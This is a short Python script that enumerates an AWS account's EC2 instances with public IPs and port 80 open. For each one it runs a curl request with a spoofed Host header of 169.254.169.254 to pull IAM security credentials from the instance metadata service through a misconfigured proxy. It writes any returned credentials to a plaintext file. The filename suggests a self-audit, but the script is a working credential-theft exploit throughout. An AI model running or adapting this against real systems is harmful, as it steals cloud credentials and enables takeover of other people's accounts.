import boto3
import json
import os

session = boto3.session.Session(profile_name='seon', region_name='ap-northeast-2')
client = session.client('ec2')

response = client.describe_instances()

with open('./check_to_CLOUD_BREACH_S3.txt', 'w+') as f:
	for reservation in response['Reservations']:
		for instance in reservation['Instances']:
			if instance.get('PublicIpAddress'):
				for securityGroup in instance['SecurityGroups']:
					response2 = client.describe_security_groups(GroupIds=[securityGroup['GroupId']])
					for ip in response2['SecurityGroups']:
						for port in ip['IpPermissions']:
							if port.get('FromPort') and str(port['FromPort']) == "80":    
								print(' *Instance: ' + instance['InstanceId'])
								f.write(' *Instance: ' + instance['InstanceId'] + '\n')
								print('|-PublicIp: ' + instance['PublicIpAddress'])
								f.write('|-PublicIp: ' + instance['PublicIpAddress'] + '\n')
								print('|-sg name: ' + securityGroup['GroupId'])
								f.write('|-sg name: ' + securityGroup['GroupId'] + '\n')
								print('ㄴInboud: '+ str(port['FromPort']))
								f.write('|-Inboud: '+ str(port['FromPort']) + '\n')
								string = 'curl http://' + instance['PublicIpAddress'] + '/latest/meta-data/iam/security-credentials -H \"Host: 169.254.169.254\"'
								print('ㄴRequestURI: ' + string)
								f.write(os.popen(string).read())
								f.write('\n')                                
f.close()